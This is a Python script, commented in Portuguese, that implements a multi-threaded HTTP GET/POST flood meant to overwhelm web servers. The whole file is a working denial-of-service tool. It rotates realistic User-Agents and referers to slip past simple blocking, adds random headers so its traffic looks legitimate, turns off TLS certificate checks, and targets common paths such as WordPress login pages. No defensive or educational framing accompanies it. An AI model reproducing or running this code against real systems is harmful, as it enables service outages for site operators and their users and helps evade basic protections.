#!/usr/bin/env python3
"""
HTTP Flood — GET/POST requests em massa para sobrecarregar servidores web.
Suporta:
  - GET flood (padrão)
  - POST flood com dados
  - Multi-thread
  - User-Agent aleatório
  - Headers personalizados
"""

import socket
import ssl
import random
import time
import threading
from urllib.parse import urlparse


# Lista de User-Agents realistas para evitar bloqueios simples
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://search.yahoo.com/",
    "https://duckduckgo.com/",
    "https://t.co/",
    "https://www.facebook.com/",
    "https://www.reddit.com/",
    "",
]

PATHS = [
    "/", "/index.html", "/index.php", "/home", "/login",
    "/wp-admin/", "/wp-login.php", "/wp-content/", "/wp-includes/",
    "/api/", "/v1/", "/v2/", "/api/v1/", "/api/v2/",
    "/search", "/about", "/contact", "/products", "/services",
    "/images/", "/css/", "/js/", "/assets/",
    "/robots.txt", "/sitemap.xml", "/favicon.ico",
    "/cdn-cgi/", "/cgi-bin/",
]


def _build_http_request(host: str, method: str = "GET", path: str = "/",
                        port: int = 80) -> bytes:
    """Constrói request HTTP manualmente."""
    
    user_agent = random.choice(USER_AGENTS)
    referer = random.choice(REFERERS)
    
    # Headers personalizados
    headers = [
        f"{method} {path} HTTP/1.1".encode(),
        f"Host: {host}".encode(),
        f"User-Agent: {user_agent}".encode(),
        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8".encode(),
        f"Accept-Language: en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7".encode(),
        f"Accept-Encoding: gzip, deflate".encode(),
        f"Connection: keep-alive".encode(),
    ]
    
    if referer:
        headers.append(f"Referer: {referer}".encode())
    
    # Headers aleatórios para parecer mais legítimo
    if random.random() > 0.5:
        headers.append(f"Cache-Control: no-cache".encode())
    if random.random() > 0.7:
        headers.append(f"DNT: 1".encode())
    
    if method == "POST":
        post_data = f"data={random.randint(0, 999999)}&timestamp={int(time.time())}"
        headers.append(b"Content-Type: application/x-www-form-urlencoded")
        headers.append(f"Content-Length: {len(post_data)}".encode())
    
    request = b"\r\n".join(headers) + b"\r\n\r\n"
    
    if method == "POST":
        request += post_data.encode()
    
    return request


def http_flood(target_ip: str, target_port: int = 80, duration: int = 60,
               stop_event: threading.Event = None, method: str = "GET",
               threads: int = 8, use_ssl: bool = False, host: str = None):
    """
    HTTP Flood attack.
    
    Args:
        target_ip: IP do alvo
        target_port: Porta (80 HTTP, 443 HTTPS)
        duration: Duração em segundos
        stop_event: Evento para parar
        method: GET ou POST
        threads: Número de threads
        use_ssl: Se True, usa TLS/SSL (HTTPS)
        host: Host header (se None, usa target_ip)
    """
    
    if stop_event is None:
        stop_event = threading.Event()
    
    if host is None:
        host = target_ip
    
    def flood_worker(worker_id):
        end_time = time.time() + duration
        
        # Conexão persistente: reusa socket para múltiplos requests
        sock = None
        
        while time.time() < end_time:
            if stop_event.is_set():
                break
            
            try:
                if sock is None:
                    # Cria nova conexão
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    
                    if use_ssl:
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        sock = ctx.wrap_socket(sock, server_hostname=host)
                    
                    sock.connect((target_ip, target_port))
                
                path = random.choice(PATHS)
                request = _build_http_request(host, method, path, target_port)
                sock.sendall(request)
                
                # Lê resposta (parcial)
                try:
                    sock.recv(4096)
                except:
                    sock.close()
                    sock = None  # Reconecta na próxima iteração
                
            except (ConnectionRefusedError, ConnectionResetError, 
                    BrokenPipeError, OSError, ssl.SSLError):
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
                sock = None
                time.sleep(0.1)  # Evita flood de reconexão
            except Exception as e:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
                sock = None
        
        if sock:
            try:
                sock.close()
            except:
                pass
    
    workers = []
    for i in range(threads):
        t = threading.Thread(target=flood_worker, args=(i,), daemon=True)
        t.start()
        workers.append(t)
    
    for t in workers:
        t.join()


if __name__ == '__main__':
    print("[*] Testando HTTP flood por 5 segundos...")
    stop = threading.Event()
    t = threading.Thread(target=http_flood, args=('127.0.0.1', 80, 5, stop))
    t.start()
    time.sleep(5)
    stop.set()
    print("[*] Teste finalizado.")
